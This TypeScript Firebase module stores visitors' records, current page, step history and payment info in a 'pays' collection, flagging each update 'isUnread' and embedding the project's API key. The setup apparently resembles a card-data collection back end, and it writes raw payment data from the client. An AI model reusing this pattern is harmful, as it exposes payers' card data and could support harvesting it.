211111111// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc, updateDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyA1SM6u61pYP3Uivsnd9o2-xfnIdk3Ci2w",
  authDomain: "tannns-f866c.firebaseapp.com",
  databaseURL: "https://tannns-f866c-default-rtdb.firebaseio.com",
  projectId: "tannns-f866c",
  storageBucket: "tannns-f866c.firebasestorage.app",
  messagingSenderId: "551542084902",
  appId: "1:551542084902:web:16f3ee59d46ee5c3881de7",
  measurementId: "G-PVTG0CY9QF"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function getData(id: string) {
  try {
    const { getDoc, doc } = await import('firebase/firestore');
    const docRef = doc(db, 'pays', id);
    const docSnap = await getDoc(docRef);
    
    if (docSnap.exists()) {
      return docSnap.data();
    } else {
      return null;
    }
  } catch (e) {
    console.error('Error getting document: ', e);
    return null;
  }
}

export async function saveToHistory(visitorID: string, step: number) {
  try {
    // Get current data
    const currentData = await getData(visitorID);
    
    if (!currentData) {
      console.log('No current data to save to history');
      return;
    }
    
    // Create history entry (exclude history itself to avoid nesting)
    const { history, ...dataToSave } = currentData;
    
    const historyEntry = {
      timestamp: new Date().toISOString(),
      step: step,
      data: dataToSave
    };
    
    // Get existing history or create new array
    const existingHistory = currentData.history || [];
    
    // Add new entry
    const updatedHistory = [...existingHistory, historyEntry];
    
    // Save back to Firebase
    await addData({
      id: visitorID,
      history: updatedHistory
    });
    
    console.log('Saved to history:', historyEntry);
  } catch (e) {
    console.error('Error saving to history: ', e);
  }
}

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef, { 
      ...data, 
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isUnread: true  // Mark as unread whenever data is updated
    }, {merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db, database, updateDoc, doc };